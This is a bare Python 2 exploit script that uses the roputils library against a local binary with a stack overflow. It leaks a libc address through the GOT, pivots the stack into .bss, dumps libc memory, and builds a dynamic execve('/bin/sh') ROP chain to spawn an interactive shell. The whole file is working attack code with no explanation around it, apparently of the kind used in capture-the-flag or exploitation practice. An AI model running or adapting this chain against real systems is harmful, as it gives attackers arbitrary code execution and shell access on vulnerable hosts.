from roputils import *

fpath = sys.argv[1]
offset = int(sys.argv[2])

rop = ROP(fpath)
addr_stage = rop.section('.bss') + 0x800

buf = rop.fill(offset)
buf += rop.call_plt('write', 1, rop.got('__libc_start_main'), 4)
buf += rop.call_plt('read', 0, addr_stage, 100)
buf += rop.pivot(addr_stage)

p = Proc(rop.fpath)
p.write(p32(len(buf)) + buf)
print "[+] read: %r" % p.read(len(buf))
ref_addr = p.read_p32()
print "[+] ref_addr: %x" % ref_addr

buf = rop.call_plt('write', 1, ref_addr, 0x200000)
buf += rop.call_plt('read', 0, addr_stage-100, 100)
buf += rop.pivot(addr_stage-100)
buf += rop.fill(100, buf)

p.write(buf)
data = p.read(0x200000)

buf = rop.dynamic_syscall(ref_addr, data, 11, addr_stage-52, addr_stage-60, 0)
print "[+] offset to argv: %d" % (len(buf)-100)
buf += p32(addr_stage-52)
buf += p32(0)
buf += rop.string('/bin/sh')
buf += rop.fill(100, buf)

p.write(buf)
p.interact()
